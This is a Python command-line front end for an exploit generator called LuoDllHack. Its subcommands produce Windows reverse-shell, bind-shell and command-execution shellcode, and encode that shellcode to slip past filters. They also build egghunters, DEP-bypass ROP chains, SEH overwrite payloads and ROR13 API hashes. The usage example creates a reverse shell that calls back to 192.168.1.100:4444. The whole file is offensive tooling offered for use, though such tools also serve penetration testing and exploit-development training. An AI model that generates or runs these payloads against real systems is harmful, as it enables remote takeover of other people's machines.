#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LuoDllHack - EXP Generator CLI Tool

Usage:
    python exp_cli.py reverse 192.168.1.100 4444           # Generate reverse shell
    python exp_cli.py bind 4444                            # Generate bind shell
    python exp_cli.py pattern -l 1000                      # Generate pattern
    python exp_cli.py pattern -v 0x41414141                # Find pattern offset
    python exp_cli.py rop target.dll --chain virtualprotect  # Generate ROP chain
    python exp_cli.py encode shellcode.bin --type xor      # Encode shellcode
    python exp_cli.py egg w00t                             # Generate egghunter
"""

import sys
import argparse
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from luodllhack.exploit import (
    ExpGenerator, ExploitConfig, ExploitResult,
    WindowsShellcode, ShellcodeEncoder, Egghunter,
    ROPGadgetFinder, ROPChainBuilder,
    PatternGenerator, BadCharFinder,
    ASLRBypass, SEHExploit
)


def cmd_reverse_shell(args):
    """Generate reverse shell"""
    wsc = WindowsShellcode(arch=args.arch)
    result = wsc.reverse_shell(args.ip, args.port)

    print(f"[+] Reverse Shell ({args.arch})")
    print(f"    Target: {args.ip}:{args.port}")
    print(f"    Size: {result.size} bytes")

    if args.output:
        with open(args.output, 'wb') as f:
            f.write(result.data)
        print(f"    Saved: {args.output}")
    else:
        print(f"    Hex: {result.data[:64].hex()}...")

    if result.bad_chars_found:
        print(f"    [!] Bad chars found: {[hex(c) for c in result.bad_chars_found]}")


def cmd_bind_shell(args):
    """Generate bind shell"""
    wsc = WindowsShellcode(arch=args.arch)
    result = wsc.bind_shell(args.port)

    print(f"[+] Bind Shell ({args.arch})")
    print(f"    Port: {args.port}")
    print(f"    Size: {result.size} bytes")

    if args.output:
        with open(args.output, 'wb') as f:
            f.write(result.data)
        print(f"    Saved: {args.output}")
    else:
        print(f"    Hex: {result.data[:64].hex()}...")


def cmd_exec(args):
    """Generate exec command shellcode"""
    wsc = WindowsShellcode(arch=args.arch)
    result = wsc.exec_command(args.command)

    print(f"[+] Exec Command ({args.arch})")
    print(f"    Command: {args.command}")
    print(f"    Size: {result.size} bytes")

    if args.output:
        with open(args.output, 'wb') as f:
            f.write(result.data)
        print(f"    Saved: {args.output}")


def cmd_pattern(args):
    """Generate/find pattern"""
    pg = PatternGenerator()

    if args.length:
        pattern = pg.create(args.length)
        print(f"[+] Pattern ({args.length} bytes):")
        print(pattern.decode('latin-1'))

        if args.output:
            with open(args.output, 'wb') as f:
                f.write(pattern)
            print(f"\n    Saved: {args.output}")

    elif args.value:
        value = int(args.value, 16) if args.value.startswith('0x') else int(args.value)
        offset = pg.offset(value)
        if offset is not None:
            print(f"[+] Offset for 0x{value:08X}: {offset}")
        else:
            print(f"[-] Pattern not found for 0x{value:08X}")


def cmd_encode(args):
    """Encode shellcode"""
    # Read shellcode
    with open(args.input, 'rb') as f:
        shellcode = f.read()

    enc = ShellcodeEncoder()

    encode_funcs = {
        'xor': lambda: enc.xor_encode(shellcode, args.key or 0xAA),
        'sub': lambda: enc.sub_encode(shellcode, args.key or 0x01),
        'add': lambda: enc.add_encode(shellcode, args.key or 0x01),
        'alpha': lambda: enc.alphanumeric_encode(shellcode),
        'unicode': lambda: enc.unicode_encode(shellcode),
        'multi': lambda: enc.multi_xor_encode(shellcode),
        'null_free': lambda: enc.null_free_encode(shellcode),
    }

    if args.type not in encode_funcs:
        print(f"[-] Unknown encoder: {args.type}")
        print(f"    Available: {list(encode_funcs.keys())}")
        return

    result = encode_funcs[args.type]()

    print(f"[+] Encoded Shellcode ({result.encoder_type})")
    print(f"    Original: {result.original_size} bytes")
    print(f"    Encoded: {len(result.data)} bytes")
    print(f"    Key: 0x{result.key:02X}")

    if args.output:
        with open(args.output, 'wb') as f:
            f.write(result.data)
        print(f"    Saved: {args.output}")
    else:
        print(f"    Hex: {result.data.hex()}")


def cmd_egghunter(args):
    """Generate egghunter"""
    eh = Egghunter()
    egg = args.egg.encode() if isinstance(args.egg, str) else args.egg

    if len(egg) != 4:
        print(f"[-] Egg must be 4 bytes, got {len(egg)}")
        return

    result = eh.generate(egg=egg, method=args.method)

    print(f"[+] Egghunter ({result.method})")
    print(f"    Egg: {egg}")
    print(f"    Size: {result.size} bytes")
    print(f"    Hex: {result.stub.hex()}")

    if args.output:
        with open(args.output, 'wb') as f:
            f.write(result.stub)
        print(f"    Saved: {args.output}")


def cmd_rop(args):
    """Generate ROP chain"""
    builder = ROPChainBuilder(arch=args.arch)

    if args.chain == 'virtualprotect':
        result = builder.build_virtualprotect(
            args.dll,
            shellcode_addr=args.shellcode_addr or 0x12345678,
            shellcode_size=args.size or 0x1000
        )
    elif args.chain == 'virtualalloc':
        result = builder.build_virtualalloc(
            args.dll,
            alloc_size=args.size or 0x1000
        )
    elif args.chain == 'wpm':
        result = builder.build_writeprocessmemory(
            args.dll,
            shellcode_ptr=args.shellcode_addr or 0x12345678,
            shellcode_size=args.size or 0x200
        )
    else:
        print(f"[-] Unknown chain type: {args.chain}")
        print("    Available: virtualprotect, virtualalloc, wpm")
        return

    print(f"[+] ROP Chain ({result.chain_type})")
    print(f"    Success: {result.success}")
    print(f"    Size: {len(result.payload)} bytes")
    print(f"    Arch: {result.arch}")

    if result.gadgets_used:
        print("    Gadgets:")
        for g in result.gadgets_used:
            print(f"      0x{g.address:08x}: {g.instructions}")

    if result.missing_gadgets:
        print(f"    Missing: {result.missing_gadgets}")

    if args.output and result.payload:
        with open(args.output, 'wb') as f:
            f.write(result.payload)
        print(f"    Saved: {args.output}")


def cmd_seh(args):
    """Generate SEH exploit"""
    seh = SEHExploit()

    # Generate nSEH
    nseh = seh.generate_nseh(jump_distance=args.jump or 6)
    print(f"[+] nSEH (JMP +{args.jump or 6}): {nseh.hex()}")

    if args.ppr:
        ppr_addr = int(args.ppr, 16)
        shellcode = b'\x90' * 32 + b'\xCC'  # Example

        result = seh.generate_payload(
            seh_offset=args.offset,
            pop_pop_ret_addr=ppr_addr,
            shellcode=shellcode
        )

        print(f"[+] SEH Payload")
        print(f"    Size: {len(result.payload)} bytes")
        print(f"    nSEH offset: {result.nseh_offset}")
        print(f"    SEH offset: {result.seh_offset}")

        if args.output:
            with open(args.output, 'wb') as f:
                f.write(result.payload)
            print(f"    Saved: {args.output}")


def cmd_badchars(args):
    """Bad character detection"""
    bf = BadCharFinder()

    # Generate test string (0x00 - 0xFF)
    test = bytes(bf.default_test_range)
    print(f"[+] Bad Char Test String ({len(test)} bytes)")

    if args.output:
        with open(args.output, 'wb') as f:
            f.write(test)
        print(f"    Saved: {args.output}")
    else:
        # Display by line
        for i in range(0, 256, 16):
            line = test[i:i+16]
            hex_str = ' '.join(f'{b:02x}' for b in line)
            print(f"    {i:02x}: {hex_str}")


def cmd_hash(args):
    """Calculate API hash"""
    enc = ShellcodeEncoder()

    for name in args.names:
        h = enc.ror13_hash(name)
        print(f"    {name}: 0x{h:08X}")


def main():
    parser = argparse.ArgumentParser(
        prog="exp_cli",
        description="LuoDllHack EXP Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    subparsers = parser.add_subparsers(dest='command', help='Command')

    # reverse shell
    p_reverse = subparsers.add_parser('reverse', help='Generate reverse shell')
    p_reverse.add_argument('ip', help='Target IP')
    p_reverse.add_argument('port', type=int, help='Target port')
    p_reverse.add_argument('--arch', default='x86', choices=['x86', 'x64'])
    p_reverse.add_argument('-o', '--output', help='Output file')
    p_reverse.set_defaults(func=cmd_reverse_shell)

    # bind shell
    p_bind = subparsers.add_parser('bind', help='Generate bind shell')
    p_bind.add_argument('port', type=int, help='Listening port')
    p_bind.add_argument('--arch', default='x86', choices=['x86', 'x64'])
    p_bind.add_argument('-o', '--output', help='Output file')
    p_bind.set_defaults(func=cmd_bind_shell)

    # exec
    p_exec = subparsers.add_parser('exec', help='Execute command')
    p_exec.add_argument('command', help='Command to execute')
    p_exec.add_argument('--arch', default='x86', choices=['x86', 'x64'])
    p_exec.add_argument('-o', '--output', help='Output file')
    p_exec.set_defaults(func=cmd_exec)

    # pattern
    p_pattern = subparsers.add_parser('pattern', help='Pattern Generation/Search')
    p_pattern.add_argument('-l', '--length', type=int, help='Length of pattern to generate')
    p_pattern.add_argument('-v', '--value', help='Hex value to find offset for')
    p_pattern.add_argument('-o', '--output', help='Output file')
    p_pattern.set_defaults(func=cmd_pattern)

    # encode
    p_encode = subparsers.add_parser('encode', help='Encode shellcode')
    p_encode.add_argument('input', help='Input shellcode file')
    p_encode.add_argument('-t', '--type', default='xor',
                          choices=['xor', 'sub', 'add', 'alpha', 'unicode', 'multi', 'null_free'])
    p_encode.add_argument('-k', '--key', type=int, help='Encoding key')
    p_encode.add_argument('-o', '--output', help='Output file')
    p_encode.set_defaults(func=cmd_encode)

    # egghunter
    p_egg = subparsers.add_parser('egg', help='Generate egghunter')
    p_egg.add_argument('egg', default='w00t', nargs='?', help='4-byte egg tag')
    p_egg.add_argument('-m', '--method', default='seh',
                       choices=['seh', 'ntaccess', 'isbadreadptr'])
    p_egg.add_argument('-o', '--output', help='Output file')
    p_egg.set_defaults(func=cmd_egghunter)

    # rop
    p_rop = subparsers.add_parser('rop', help='Generate ROP chain')
    p_rop.add_argument('dll', help='Target DLL path')
    p_rop.add_argument('-c', '--chain', default='virtualprotect',
                       choices=['virtualprotect', 'virtualalloc', 'wpm'])
    p_rop.add_argument('--arch', default='x86', choices=['x86', 'x64'])
    p_rop.add_argument('--shellcode-addr', type=lambda x: int(x, 16), help='Shellcode address (hex)')
    p_rop.add_argument('--size', type=int, help='Size')
    p_rop.add_argument('-o', '--output', help='Output file')
    p_rop.set_defaults(func=cmd_rop)

    # seh
    p_seh = subparsers.add_parser('seh', help='SEH exploit')
    p_seh.add_argument('--offset', type=int, required=True, help='SEH offset')
    p_seh.add_argument('--ppr', help='POP-POP-RET address (hex)')
    p_seh.add_argument('--jump', type=int, default=6, help='nSEH jump distance')
    p_seh.add_argument('-o', '--output', help='Output file')
    p_seh.set_defaults(func=cmd_seh)

    # badchars
    p_bad = subparsers.add_parser('badchars', help='Bad character testing')
    p_bad.add_argument('-o', '--output', help='Output file')
    p_bad.set_defaults(func=cmd_badchars)

    # hash
    p_hash = subparsers.add_parser('hash', help='Calculate API hash')
    p_hash.add_argument('names', nargs='+', help='API names')
    p_hash.set_defaults(func=cmd_hash)

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return

    args.func(args)


if __name__ == '__main__':
    main()
